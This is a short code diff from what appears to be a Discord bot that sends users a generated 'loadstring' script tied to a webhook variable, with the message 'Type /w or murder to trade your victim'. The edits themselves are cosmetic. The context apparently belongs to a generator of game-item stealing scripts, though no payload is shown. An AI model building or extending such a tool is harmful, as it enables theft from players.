@@ -297,7 +297,7 @@ Webhook = "${webhook}"
                text: "Type /w or murder to trade your victim"
              }
            }],
-           components: [g5
+           components: [
              new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                  .setCustomId(`copy_loadstring_${scriptId}`)
@@ -307,7 +307,7 @@ Webhook = "${webhook}"
            ]
          };
          await interaction.user.send(loadstringEmbed);
-
+        
          // Third message with the original script in a red embed for reference
          await interaction.user.send({
            embeds: [{
